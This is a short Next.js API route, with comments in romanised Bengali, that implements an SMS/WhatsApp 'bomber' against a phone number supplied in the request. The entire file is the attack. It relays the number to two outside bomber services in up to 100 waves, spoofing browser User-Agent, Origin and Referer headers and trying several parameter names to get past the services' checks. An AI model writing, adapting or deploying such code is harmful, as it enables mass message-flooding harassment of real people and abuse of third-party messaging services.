// pages/api/attack.js

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Method not allowed');

  const { number, amount, isUltimate } = req.body;

  // Amra ekhane direct URL construction korbo jate query string bypass hoy
  const targetBaseUrls = [
    'https://shadowx-sms-bomber.onrender.com/api/send', 
    'https://nuke-sms-bomber.pages.dev/api/attack'
  ];

  const runAttack = async () => {
    const totalWaves = isUltimate ? 100 : amount; 
    const delay = isUltimate ? 500 : 2000; 

    for (let i = 0; i < totalWaves; i++) {
      // Amra ekhane ekta "Chaos" method use korbo
      // Mane ekshathe multiple parameter try korbo
      const attackPromises = targetBaseUrls.map(async (url) => {
        try {
          // Amra ekta fake request header set korbo jate eta ekdom real lage
          const response = await fetch(url, {
            method: 'POST',
            headers: { 
              'Content-Type': 'application/json',
              'Accept': 'application/json',
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
              'Origin': 'https://shadowx-sms-bomber.onrender.com',
              'Referer': 'https://shadowx-sms-bomber.onrender.com/',
            },
            body: JSON.stringify({
              // Amra ekhane multiple formats try korchi
              number: number,
              phone: number,
              target: number,
              mobile: number,
              amount: 1,
              count: 1,
              country: "BD",
              service: "whatsapp",
              msg: "Ultimate Attack",
              auth: "true",
              token: "123456789"
            }),
          });

          console.log(`[Wave ${i}] Target: ${url} | Status: ${response.status}`);
        } catch (err) {
          console.error(`[Wave ${i}] Error: ${err.message}`);
        }
      });

      await Promise.all(attackPromises);
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  };

  runAttack();

  return res.status(200).json({ 
    success: true, 
    message: isUltimate ? "ULTIMATE ATTACK STARTED! 🚀" : "ATTACK STARTED! 🔥" 
  });
}
